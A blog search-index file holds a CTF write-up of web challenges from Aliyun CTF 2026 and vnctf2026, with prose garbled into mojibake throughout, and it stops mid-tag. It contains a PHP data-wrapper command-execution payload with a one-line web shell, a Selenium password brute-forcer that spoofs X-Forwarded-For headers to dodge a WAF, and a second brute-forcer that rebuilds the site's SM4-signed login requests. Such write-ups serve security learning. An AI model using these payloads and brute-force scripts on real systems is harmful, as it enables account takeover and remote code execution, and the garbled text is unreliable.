<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æœ€è¿‘çš„ä¸€äº›æ¯”èµ›</title>
    <link href="/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B/"/>
    <url>/%E6%9C%80%E8%BF%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%AF%94%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æ–°äººèµ›è¿˜æŒºå¤šçš„ï¼Œéƒ½é›†ä¸­åœ¨è¿™å‡ å¤©ï¼Œåšçš„è¿˜æ˜¯æ»¡èµ¶çš„ï¼Œè¿˜å¥½æˆ‘ä¹Ÿä¸æ˜¯æ­£ç»æ‰“æ¯”èµ›çš„ï¼Œå°±æ˜¯ç»ƒä¹ çš„ï¼Œä¸æ˜¯å¾ˆç€æ€¥ã€‚ä¸å¾—ä¸è¯´æ¯”èµ›å’Œå¹³æ—¶åˆ·é¢˜è¿˜æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæœ¬æ ¡çš„hgame2026ï¼Œè¿™ä¸ªå› ä¸ºè¿˜æ²¡ç»“æŸï¼Œè¿˜ä¸èƒ½æ”¾å‡ºwp</p><h1 id="é˜¿é‡Œäº‘CTF2026"><a href="#é˜¿é‡Œäº‘CTF2026" class="headerlink" title="é˜¿é‡Œäº‘CTF2026"></a>é˜¿é‡Œäº‘CTF2026</h1><p>è¿™ä¸ªæ¯”èµ›å°±åšäº†ä¸€ä¸ªç­¾åˆ°ï¼Œåé¢çš„å°±ä¸æ˜¯æˆ‘è¿™ä¸ªèœé¸Ÿèƒ½ç¢°ç“·çš„äº†</p><h2 id="Easy-Login"><a href="#Easy-Login" class="headerlink" title="Easy Login"></a>Easy Login</h2><p>æŠŠæºç äº¤ç»™Geminiåˆ†æ</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842367534-8678fb3e-6062-4009-9d2c-809ef1f4b4d6.png"></p><p>ç„¶åå…ˆç”¨æ­£å¸¸ç½‘å€è®©visitè®¿é—®ï¼Œç„¶åå†æ„é€ cookie</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769842400827-4cb4e654-1734-472e-8096-ebcd4f54cb78.png"></p><h1 id="vnctf2026"><a href="#vnctf2026" class="headerlink" title="vnctf2026"></a>vnctf2026</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825048105-58c22be7-71b3-43d3-972a-19af55cfebca.png"></p><p>phpä»£ç å®¡è®¡</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825161713-2f4eba23-3c37-4e9c-ba7b-60085085465c.png"></p><p>æ ¹æ®aiç»™çš„å¼•å¯¼ï¼Œæˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªçŸ­æ ‡ç­¾+dataåè®®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data:,&lt;?=`ls`;<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œäº†ï¼Œç°åœ¨æ‰¾flagå°±è¡Œäº†ï¼ŒåŒæ—¶æ³¨æ„payloadé•¿åº¦</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825264126-4b7968dc-40b1-4b6a-a73d-541acdaf202c.png"></p><p>ç„¶åæ€è·¯æ˜¯ç”¨ä¸€å¥è¯æœ¨é©¬</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825464179-dd8b027d-9040-4a7a-ad12-677b782988dd.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">data:,&lt;?=`$_GET[a]`;&amp;a=ls /<br></code></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯æˆåŠŸç»•è¿‡äº†ï¼Œæ‹¿åˆ°äº†flag</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825657541-671f87f6-c0f1-4953-aa2f-625ccca26a2d.png"></p><p>è¿™ä¸ªé¢˜ç›®éš¾åº¦å¯¹äºè€æ‰‹æ¥è¯´è‚¯å®šå¾ˆç®€å•ï¼Œæ¯•ç«Ÿç­¾åˆ°é¢˜ï¼Œå¯¹æˆ‘ä»¬è¿™æ ·çš„æ–°æ‰‹æ¥è¯´è¦ç†Ÿæ‚‰phpæºç ï¼Œå¹¶ä¸”çŸ¥é“dataåè®®ä¸ç”¨//ä¹Ÿå¯ä»¥</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769825811998-b4d90836-f36d-4e17-a04d-3fcbc85a2b77.png"></p><h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826635536-d042c905-e91c-4b48-998f-3cc9efdcf526.png"></p><p>è®¿é—®æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œé¢˜ç›®è¿˜ç»™äº†ä¸€ä¸ªpasswordé™„ä»¶ï¼Œå¯èƒ½æ˜¯çˆ†ç ´ï¼Œç™»å½•çš„è¯·æ±‚åŒ…åº”è¯¥æ˜¯åšäº†åŠ å¯†å¤„ç†çš„</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826711133-a5df40b9-4913-4fb8-b1ba-17fa1845b9c5.png"></p><p>base64è§£ç ä¹‹åå‘ç°æ˜¯pï¼Œqï¼Œnï¼Œä¸€å¼€å§‹æƒ³çš„æ˜¯rsaï¼Œä½†æ˜¯åé¢åˆå¦å®šï¼Œå› ä¸ºpqéƒ½æ˜¯è®¡ç®—ç§é’¥ç”¨çš„ä¸œè¥¿ï¼Œæ€ä¹ˆæ˜¯è‡ªå·±æä¾›ç»™æœåŠ¡å™¨ï¼Œç„¶åå°†jsæ–‡ä»¶å‘ç»™Geminiï¼Œå¾—åˆ°ç»“æœ</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769826924969-7586fa85-444f-4b78-9c82-9a5b134a7d25.png"></p><p>å¥½å®¶ä¼™ï¼Œè¿™å°±å¾ˆéš¾æäº†ï¼Œæˆ‘ä¸€ç›´å¯¹jsä¸€çªä¸é€šï¼Œåé¢è¿˜æ˜¯è®©Geminiå…ˆå†™ä¸€ä¸ªè„šæœ¬è¯•è¯•ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯åŠ å¯†æ–¹å¼æœ‰é—®é¢˜è¿˜æ˜¯æ€ä¹ˆï¼Œåæ­£æœåŠ¡ç«¯è¿”å›something went wrongï¼Œæå¾—æˆ‘åªèƒ½ç”¨webdriverå¼€å¯æ¨¡æ‹Ÿæµè§ˆå™¨ï¼Œç„¶åä¸€ä¸ªä¸ªå¯†ç è¾“å…¥è¿›å»ï¼Œæ¨¡æ‹Ÿç‚¹å‡»ç™»å½•ï¼ŒåŒæ—¶è¿˜è¦é™åˆ¶é€Ÿç‡ï¼Œä¸ç„¶æœåŠ¡ç«¯ä¼šæç¤ºhackerï¼ŒèŠ±äº†æˆ‘å¥½å‡ ä¸ªå°æ—¶ï¼Œæ€»ç®—æ˜¯å¼„å‡ºæ¥äº†</p><p>çˆ†ç ´è„šæœ¬åœ¨è¿™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs shell">import random<br>import time<br>import threading<br>from concurrent.futures import ThreadPoolExecutor<br>from tqdm import tqdm<br>from selenium import webdriver<br>from selenium.webdriver.common.by import By<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= é…ç½®åŒº =================</span><br>TARGET_URL = &quot;http://114.66.24.228:31046/&quot;<br>USERNAME = &quot;admin&quot;<br>THREAD_COUNT = 3<br>STOP_EVENT = threading.Event()<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= æ ¸å¿ƒå·¥ä½œå‡½æ•° =================</span><br><br>def get_random_ip() :<br>    return f&quot;&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;.&#123;random.randint( 1 , 255 )&#125;&quot;<br><br><br>def worker(password_list , pbar) :<br>    if STOP_EVENT.is_set() :<br>        return<br><br>    # ä½¿ç”¨æ ‡å‡† Selenium<br>    options = webdriver.ChromeOptions()<br>    # options.add_argument(&quot;--headless&quot;)<br>    driver = webdriver.Chrome( options=options )<br><br>    driver.get( TARGET_URL )<br><br>    try :<br>        for pwd in password_list :<br>            if STOP_EVENT.is_set() :<br>                break<br><br>            try :<br>                # --- å…³é”®ï¼šåˆ©ç”¨ CDP åè®®åœ¨å‘åŒ…å‰ä¿®æ”¹ Header ---<br>                # è¿™ç§æ–¹æ³•ä¸ä¾èµ–ä»»ä½•ç¬¬ä¸‰æ–¹åº“ï¼Œç›´æ¥æ§åˆ¶ Chrome å†…æ ¸<br>                random_ip = get_random_ip()<br>                driver.execute_cdp_cmd( &#x27;Network.enable&#x27; , &#123;&#125; )<br>                driver.execute_cdp_cmd( &#x27;Network.setExtraHTTPHeaders&#x27; , &#123;<br>                    &#x27;headers&#x27; : &#123;&#x27;X-Forwarded-For&#x27; : random_ip&#125;<br>                &#125; )<br><br>                # å®šä½å…ƒç´ <br>                user_box = driver.find_element( By.CSS_SELECTOR , &quot;input[type=&#x27;text&#x27;]&quot; )<br>                pass_box = driver.find_element( By.CSS_SELECTOR , &quot;input[type=&#x27;password&#x27;]&quot; )<br>                login_btn = driver.find_element( By.TAG_NAME , &quot;button&quot; )<br>                result_label = driver.find_element( By.ID , &quot;result&quot; )<br><br>                # è¾“å…¥ä¸ç‚¹å‡»<br>                user_box.clear()<br>                user_box.send_keys( USERNAME )<br>                pass_box.clear()<br>                pass_box.send_keys( pwd )<br>                login_btn.click()<br><br>                # ç­‰å¾…å›åŒ…<br>                time.sleep( 0.6 )<br>                status = result_label.text.strip()<br><br>                if &quot;hacker&quot; in status.lower() :<br>                    pbar.write( f&quot;[!] è§¦å‘ WAF (hacker!) - æ­£åœ¨ä½¿ç”¨ IP: &#123;random_ip&#125;&quot; )<br>                    time.sleep( 1.5 )<br>                    continue<br><br>                if &quot;login failed!&quot; in status :<br>                    pbar.update( 1 )<br>                    continue<br><br>                # æˆåŠŸåˆ¤æ–­<br>                if status and &quot;login failed!&quot; not in status :<br>                    STOP_EVENT.set()<br>                    pbar.write( f&quot;\n\n&#123;&#x27;=&#x27; * 50&#125;\n[SUCCESS] å¯†ç æ­£ç¡®: &#123;pwd&#125;\n[RESULT]: &#123;status&#125;\n&#123;&#x27;=&#x27; * 50&#125;&quot; )<br>                    break<br><br>            except Exception :<br>                driver.get( TARGET_URL )<br>                time.sleep( 1 )<br>                continue<br>    finally :<br>        driver.quit()<br><br><br>def brute_force() :<br>    # è¯»å–å­—å…¸<br>    with open( &#x27;password&#x27; , &#x27;r&#x27; ) as f :<br>        passwords = [ line.strip() for line in f if line.strip() ]<br><br>    # ç½®é¡¶å·²çŸ¥å¯èƒ½çš„å¯†ç <br>    target_pwd = &quot;QQr0T7AvjtaSxFbiqv3yv7zw&quot;<br>    if target_pwd in passwords :<br>        passwords.remove( target_pwd )<br>    passwords.insert( 0 , target_pwd )<br><br>    total = len( passwords )<br>    chunk_size = (total // THREAD_COUNT) + 1<br>    password_chunks = [ passwords[ i :i + chunk_size ] for i in range( 0 , total , chunk_size ) ]<br><br>    pbar = tqdm( total=total , desc=&quot;CDP-Bruting&quot; , unit=&quot;pwd&quot; , dynamic_ncols=True )<br><br>    with ThreadPoolExecutor( max_workers=THREAD_COUNT ) as executor :<br>        futures = [ executor.submit( worker , chunk , pbar ) for chunk in password_chunks ]<br>        for future in futures :<br>            future.result()<br><br>    pbar.close()<br><br><br>if __name__ == &quot;__main__&quot; :<br>    brute_force()<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¯¥è„šæœ¬éœ€è¦æœ¬åœ°å®‰è£…äº†chromeçš„webdriverï¼Œä¸”ç‰ˆæœ¬éœ€è¦å¯¹åº”ä¸Š</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850367570-e059dd6f-4706-421a-9005-be46443912f8.png"></p><p>åšå®Œç¬¬äºŒå¤©ï¼Œåœ¨ç¾¤é‡Œå¬äº†å¤§ä½¬çš„æŒ‡å¯¼åï¼Œå°†jsè„šæœ¬åæ··æ·†ä¸€ä¸‹ç»™aiï¼ŒæˆåŠŸå†™å‡ºäº†ä¸€ä¸ªå¯çˆ†ç ´çš„è„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬ä¸ç®¡ä»€ä¹ˆæ—¶å€™éƒ½å¯ä»¥ç”¨ï¼Œä¸è¿‡å°±æ˜¯æ²¡æœ‰è§£å¯†å“åº”ä½“ï¼Œè¦è‡ªå·±å»æµè§ˆå™¨è¾“å‡ºå¾—åˆ°flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs shell">import json<br>import base64<br>import hashlib<br>import requests<br>import time<br>import binascii<br>import uuid<br>from gmssl import sm4<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ğŸ”´ å¿…å¡«åŒºåŸŸï¼šè¯·å¡«å…¥ä½ åˆšæ‰åœ¨æµè§ˆå™¨æ§åˆ¶å° getFinalPackage() æ•è·åˆ°çš„å€¼</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1. æ•è·åˆ°çš„ Key (32ä½ Hex)</span><br>CAPTURED_KEY = &quot;6a8d6af94060a07eba08f741ffc17fd3&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. æ•è·åˆ°çš„ IV (32ä½ Hex)</span><br>CAPTURED_IV = &quot;8d1061d89dd8983672d10a3c96647a54&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. æ•è·åˆ°çš„ Payload é‡Œçš„ q å€¼ (SM2å¯†æ–‡ï¼Œéå¸¸é•¿çš„é‚£ä¸€æ®µ)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ³¨æ„ï¼šæ˜¯ä»æŠ“åˆ°çš„ json é‡Œçš„ <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-string">&quot;...&quot;</span> é‡Œé¢å¤åˆ¶å‡ºæ¥ï¼Œä¸è¦å¸¦å¼•å·</span><br>CAPTURED_Q = &quot;367086fd33ab79866dca19f3bab3db2878cf797c9bc91039f0d06d149737499f3ccf261bff08d2de1ea16cf097752920a25db59c1e623dfbef0549c14bc1315b1666abc86b54e1ba838e49630933bd424ab762587386adb6aa6c7e7c2af0d3916a4a4d332f4f02a65156c448fa8678b692d42c4cf064ed150748c5e59c25c44ff0dd2a7402dd15133acd0b10760b14aa45df951f189f993a55edbf2c3e5089ac9e262abba9be8e9261799e22b596d17c8737&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ğŸŸ¢ é…ç½®åŒºåŸŸ (å›ºå®šå€¼)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==============================================================================</span><br>SALT = &quot;|Infernity|&quot;<br>TARGET_URL = &quot;http://114.66.24.228:33336/login&quot;  # ç¡®è®¤ç«¯å£<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è½¬æ¢ Key ä¸ºäºŒè¿›åˆ¶</span><br>KEY_BYTES = binascii.unhexlify( CAPTURED_KEY )<br>IV_BYTES = binascii.unhexlify( CAPTURED_IV )<br><br><br>def sm4_encrypt(plain_text) :<br>    &quot;&quot;&quot;SM4 CBC åŠ å¯†&quot;&quot;&quot;<br>    crypt_sm4 = sm4.CryptSM4()<br>    crypt_sm4.set_key( KEY_BYTES , sm4.SM4_ENCRYPT )<br>    # gmssl è‡ªåŠ¨å¤„ç† PKCS7 å¡«å……<br>    encrypt_value = crypt_sm4.crypt_cbc( IV_BYTES , plain_text.encode() )<br>    return encrypt_value.hex()<br><br><br>def sm4_decrypt(b64_cipher) :<br>    &quot;&quot;&quot;SM4 CBC è§£å¯†&quot;&quot;&quot;<br>    try :<br>        cipher_bytes = base64.b64decode( b64_cipher )<br>        crypt_sm4 = sm4.CryptSM4()<br>        crypt_sm4.set_key( KEY_BYTES , sm4.SM4_DECRYPT )<br>        decrypt_value = crypt_sm4.crypt_cbc( IV_BYTES , cipher_bytes )<br>        return decrypt_value.decode( &#x27;utf-8&#x27; , errors=&#x27;ignore&#x27; )<br>    except :<br>        return None<br><br><br>def solve() :<br>    # 0. å‡†å¤‡å›ºå®šçš„ KeyIvJson (ç”¨äº MD5 æ ¡éªŒ)<br>    # å¿…é¡»æ— ç©ºæ ¼ï¼Œä¸ JS ç”Ÿæˆçš„ä¸€è‡´<br>    key_iv_dict = &#123;&quot;key&quot; : CAPTURED_KEY , &quot;iv&quot; : CAPTURED_IV&#125;<br>    key_iv_json = json.dumps( key_iv_dict , separators=(&#x27;,&#x27; , &#x27;:&#x27;) )<br><br>    print( f&quot;[*] ä½¿ç”¨å›ºå®š Q å€¼çˆ†ç ´&quot; )<br>    print( f&quot;[*] Key: &#123;CAPTURED_KEY&#125;&quot; )<br>    print( f&quot;[*] IV:  &#123;CAPTURED_IV&#125;&quot; )<br><br>    # 1. è¯»å–å­—å…¸<br>    try :<br>        with open( &#x27;password&#x27; , &#x27;r&#x27; ) as f :<br>            passwords = [ line.strip() for line in f if line.strip() ]<br>    except :<br>        print( &quot;[-] é”™è¯¯ï¼šæ‰¾ä¸åˆ° password æ–‡ä»¶&quot; )<br>        return<br><br>    print( f&quot;[*] å¼€å§‹çˆ†ç ´ &#123;len( passwords )&#125; ä¸ªå¯†ç ...&quot; )<br><br>    # 2. å¾ªç¯çˆ†ç ´<br>    for pwd in passwords :<br>        # æ„é€  UserInfo<br>        # ä¸¥æ ¼éµå¾ª Hook åˆ°çš„å­—æ®µé¡ºåº: userName -&gt; passWord -&gt; timeStamp -&gt; TOKEN<br>        # æ³¨æ„ï¼štimeStamp ä½¿ç”¨å½“å‰æ—¶é—´ï¼ŒTOKEN æ¨¡æ‹Ÿ MD5 æ ¼å¼<br>        user_info = &#123;<br>            &quot;userName&quot; : &quot;admin&quot; ,<br>            &quot;passWord&quot; : pwd ,<br>            &quot;timeStamp&quot; : int( time.time() * 1000 ) ,<br>            &quot;TOKEN&quot; : hashlib.md5( str( uuid.uuid4() ).encode() ).hexdigest()<br>        &#125;<br>        # åºåˆ—åŒ– (å»ç©ºæ ¼)<br>        user_info_json = json.dumps( user_info , separators=(&#x27;,&#x27; , &#x27;:&#x27;) )<br><br>        # ç”Ÿæˆ p (åŠ å¯†æ–°çš„ user_info)<br>        p_val = sm4_encrypt( user_info_json )<br><br>        # ç”Ÿæˆ n (è®¡ç®—æ–°çš„æ ¡éªŒå€¼)<br>        # å…¬å¼: UserInfo + Salt + KeyIv<br>        n_source = user_info_json + SALT + key_iv_json<br>        n_val = hashlib.md5( n_source.encode() ).hexdigest()<br><br>        # ç»„è£… Payload (q æ˜¯å›ºå®šçš„)<br>        final_payload = &#123;<br>            &quot;p&quot; : p_val ,<br>            &quot;q&quot; : CAPTURED_Q ,<br>            &quot;n&quot; : n_val<br>        &#125;<br>        final_b64 = base64.b64encode( json.dumps( final_payload , separators=(&#x27;,&#x27; , &#x27;:&#x27;) ).encode() ).decode()<br>        #print(&quot;pwd:&quot;+pwd)<br>        # å‘åŒ…<br>        try :<br>            # å¿…é¡»å¸¦ä¸Šæ­£ç¡®çš„ Headerï¼Œå¦åˆ™å¯èƒ½è§¦å‘ 500<br>            headers = &#123;<br>                &quot;Content-Type&quot; : &quot;text/plain&quot; ,<br>                &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36&quot; ,<br>                &quot;Referer&quot; : &quot;http://114.66.24.228:33336/&quot;<br>            &#125;<br>            resp = requests.post( TARGET_URL , data=final_b64 , headers=headers )<br>            #print(resp.text)<br>            body=resp.text<br>            # ç»“æœåˆ†æ<br>            if int(resp.headers.get(&#x27;Content-Length&#x27;)) &gt;=100 :<br>                print( f&quot;\n\n&#123;&#x27;=&#x27; * 50&#125;\n[SUCCESS] å¯†ç æ­£ç¡®: &#123;pwd&#125;\n[RESULT]: &#123;body&#125;\n&#123;&#x27;=&#x27; * 50&#125;&quot; )<br>                break<br><br>        except Exception as e :<br>            pass<br><br><br>if __name__ == &quot;__main__&quot; :<br>    solve()<br></code></pre></td></tr></table></figure><h2 id="Markdown2world"><a href="#Markdown2world" class="headerlink" title="Markdown2world"></a>Markdown2world</h2><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844658929-dd26e47f-9ba0-4501-ad7b-9af07f51611f.png">è®¿é—®ä¹‹åæ˜¯ä¸€ä¸ªæ–‡æ¡£è½¬æ¢å™¨ï¼Œç„¶åé—®äº†aiä¹‹åï¼Œä¸€å¼€å§‹è®©è½¬æ¢æˆhtmlè¯•è¯•èƒ½ä¸èƒ½ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå‘ç°ä¸è¡Œã€‚ç„¶ååˆè¯•è¯•å¯ä¸å¯ä»¥å‚æ•°æ³¨å…¥ï¼Œä¹Ÿä¸è¡Œï¼Œç„¶åGeminiç»§ç»­è¯´åˆ°pandocæœ‰ä¸€ä¸ªç‰¹æ€§</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844705243-b42b80c1-dd3f-4e3e-912b-c20249747357.png"></p><p>è¯•äº†ä¸€ä¸‹ä¹‹åå‘ç°å¯è¡Œï¼Œåœ¨word/mediaä¸‹æœ‰ä¸€ä¸ª.soæ–‡ä»¶</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img 